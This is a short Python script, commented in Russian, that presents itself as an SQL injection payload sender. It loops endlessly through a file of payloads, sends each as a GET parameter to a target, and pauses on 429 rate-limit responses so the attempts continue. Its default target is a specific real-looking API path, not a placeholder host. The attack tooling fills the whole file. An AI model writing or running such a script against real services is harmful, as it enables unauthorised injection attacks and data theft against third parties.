#!/usr/bin/env python3
import argparse
import time
import requests
from urllib.parse import urlencode

def send_payloads(domain: str, payload_file: str, scheme: str = "https"):
    url = f"http://{domain}"
    session = requests.Session()

    with open(payload_file, "r", encoding="utf-8") as f:
        payloads = [line.strip() for line in f if line.strip()]

    print(f"[+] Loaded {len(payloads)} payloads from {payload_file}")
    i = 0

    while True:
        payload = payloads[i % len(payloads)]
        params = {"payload": payload}  # тут можно заменить имя параметра

        try:
            resp = session.get(url, params=params, timeout=10)
            status = resp.status_code
            full_url = f"{url}?{urlencode(params)}"
            print(f"[{time.strftime('%H:%M:%S')}] {status} -> {full_url}")
        except requests.RequestException as e:
            print(f"[!] Request error: {e}")
            status = None

        # обработка 429 Too Many Requests
        if status == 429:
            print("[!] Got 429 Too Many Requests, sleeping 60 seconds...")
            time.sleep(60)
        else:
            time.sleep(1)  # 1 запрос в секунду

        i += 1


def main():
    parser = argparse.ArgumentParser(
        description="Simple SQLi payload sender with rate limit handling (429)."
    )
    parser.add_argument(
        "-d",
        "--domain",
        default="layer8.ag/api/v1/resume",
        help="Домен или хост без схемы (например, example.com/path/to/app)"
    )
    parser.add_argument(
        "-f",
        "--file",
        default="payload.txt",
        help="Файл с payload’ами (по одному в строке, по умолчанию payload.txt)"
    )

    args = parser.parse_args()
    send_payloads(args.domain, args.file)


if __name__ == "__main__":
    main()